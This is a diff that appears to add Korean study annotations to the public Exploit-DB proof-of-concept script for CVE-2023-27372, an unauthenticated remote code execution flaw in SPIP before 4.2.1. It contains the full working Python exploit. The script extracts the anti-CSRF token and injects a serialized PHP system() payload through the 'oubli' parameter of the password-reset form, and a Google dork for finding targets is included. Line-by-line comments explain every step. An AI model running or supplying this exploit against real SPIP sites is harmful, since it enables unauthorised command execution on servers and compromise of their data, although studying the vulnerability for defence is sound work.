@@ -140,6 +140,8 @@ SPIP v4.2.0 - Remote Code Execution (Unauthenticated) | php/webapps/51536.py
 
 ---
 
+# 4.2.0 RCE 취약점 발견
+
 Shellcodes: No Results
 Papers: No Results
 
@@ -152,6 +154,8 @@ SPIP v4.2.0 - Remote Code Execution (Unauthenticated) | php/webapps/51536.py
 ```python
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
+
+# 해당 내용 코드
 
 # Exploit Title: SPIP v4.2.1 - Remote Code Execution (Unauthenticated)
 # Google Dork: inurl:"/spip.php?page=login"
@@ -170,55 +174,81 @@ SPIP v4.2.0 - Remote Code Execution (Unauthenticated) | php/webapps/51536.py
 # This PoC exploits a PHP code injection in SPIP. The vulnerability exists in the `oubli` parameter and allows an unauthenticated user to execute arbitrary commands with web user privileges.
 #
 # Usage: python3 CVE-2023-27372.py http://example.com
-
-import argparse
-import bs4
-import html
-import requests
+import argparse # 명령줄 인자(command-line arguments)를 파싱하기 위해 argparse 모듈을 가져옴.
+import bs4 # BeautifulSoup 4 (bs4) 모듈을 가져옴. HTML/XML 문서에서 데이터를 추출(스크래핑)하는 데 사용됨.
+import html # HTML 엔티티를 처리하기 위해 html 모듈을 가져옴 (주로 인코딩/디코딩).
+import requests # HTTP 요청을 보내기 위해 requests 라이브러리를 가져옴.
 
 def parseArgs():
+    # 명령줄 인자를 파싱하는 함수 정의.
     parser = argparse.ArgumentParser(description="Poc of CVE-2023-27372 SPIP < 4.2.1 - Remote Code Execution by nuts7")
+    # 스크립트 설명을 설정.
     parser.add_argument("-u", "--url", default=None, required=True, help="SPIP application base URL")
+    # 필수 인자: SPIP 애플리케이션의 기본 URL (Uniform Resource Locator)을 정의.
     parser.add_argument("-c", "--command", default=None, required=True, help="Command to execute")
+    # 필수 인자: 서버에서 실행할 명령어를 정의.
     parser.add_argument("-v", "--verbose", default=False, action="store_true", help="Verbose mode. (default: False)")
-    return parser.parse_args()
+    # 선택적 인자: 상세 모드(verbose mode) 활성화 여부를 정의.
+    return parser.parse_args() # 파싱된 인자들을 반환.
 
 def get_anticsrf(url):
+    # Cross-Site Request Forgery (CSRF) 방지 토큰(Anti-CSRF token)을 가져오는 함수 정의.
+    # SPIP의 비밀번호 재설정 페이지('/spip.php?page=spip_pass')에 요청을 보냄.
     r = requests.get('%s/spip.php?page=spip_pass' % url, timeout=10)
+    # 응답 텍스트를 파싱하기 위해 BeautifulSoup 객체를 생성.
     soup = bs4.BeautifulSoup(r.text, 'html.parser')
+    # HTML에서 이름이 'formulaire_action_args'인 <input> 태그를 찾음. 이 태그에 Anti-CSRF 토큰이 포함되어 있음.
     csrf_input = soup.find('input', {'name': 'formulaire_action_args'})
     if csrf_input:
+        # 태그를 찾았다면, 해당 태그의 'value' 속성에서 토큰 값을 추출.
         csrf_value = csrf_input['value']
         if options.verbose:
+            # 상세 모드일 경우 토큰 값을 출력.
             print("[+] Anti-CSRF token found : %s" % csrf_value)
-        return csrf_value
+        return csrf_value # 토큰 값을 반환.
     else:
+        # 토큰을 찾지 못했을 경우 오류 메시지를 출력하고 -1을 반환.
         print("[-] Unable to find Anti-CSRF token")
         return -1
 
 def send_payload(url, payload):
+    # 공격 페이로드(payload)를 전송하는 함수 정의.
     data = {
-        "page": "spip_pass",
-        "formulaire_action": "oubli",
-        "formulaire_action_args": csrf,
-        "oubli": payload
+        "page": "spip_pass", # POST 요청의 'page' 인자는 'spip_pass' (비밀번호 재설정 페이지).
+        "formulaire_action": "oubli", # 'formulaire_action' 인자는 'oubli' (잊어버림) 액션을 트리거.
+        "formulaire_action_args": csrf, # 앞에서 얻은 Anti-CSRF 토큰 값을 사용.
+        "oubli": payload # 'oubli' 파라미터에 RCE를 위한 악성 페이로드를 전달.
     }
+    # 공격 페이로드를 담은 POST 요청을 해당 URL로 전송.
     r = requests.post('%s/spip.php?page=spip_pass' % url, data=data)
     if options.verbose:
+        # 상세 모드일 경우 전송된 페이로드를 출력.
         print("[+] Execute this payload : %s" % payload)
-    return 0
+    return 0 # 함수 종료.
 
 if __name__ == '__main__':
-    options = parseArgs()
+    # 스크립트가 직접 실행될 때 실행되는 메인 블록.
+    options = parseArgs() # 명령줄 인자를 파싱하여 'options' 변수에 저장.
 
+    # HTTPS 요청 시 발생하는 SSL/TLS 경고를 비활성화하는 설정.
     requests.packages.urllib3.disable_warnings()
+    # SSL/TLS 암호화 스위트(cipher suite)를 조작하여 특정 환경에서 발생할 수 있는 연결 문제를 회피.
     requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
     try:
+        # pyOpenSSL을 사용하는 환경에서도 동일한 암호화 스위트 설정을 시도 (일관성 유지).
         requests.packages.urllib3.contrib.pyopenssl.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
     except AttributeError:
-        pass
+        pass # pyOpenSSL 관련 속성이 없을 경우 무시.
 
+    # get_anticsrf 함수를 호출하여 Anti-CSRF 토큰을 얻음.
     csrf = get_anticsrf(url=options.url)
+
+    # 최종 페이로드를 생성하고 send_payload 함수를 호출하여 전송.
+    # 페이로드 구조: s:길이:"PHP 코드";
+    # s:20+len(options.command):"<?php system('사용자 입력 명령어'); ?>";
+    # 이는 PHP의 직렬화(serialization) 포맷이며, 'oubli' 파라미터가 역직렬화될 때
+    # 악의적인 객체나 코드를 주입하여 원격 코드 실행을 유발하는 Insecure Deserialization 공격 기법을 사용.
+    # 'system()' 함수는 인자로 전달된 운영체제(Operating System, OS) 명령어를 실행.
     send_payload(url=options.url, payload="s:%s:\"<?php system('%s'); ?>\";" % (20 + len(options.command), options.command))
 ```
 
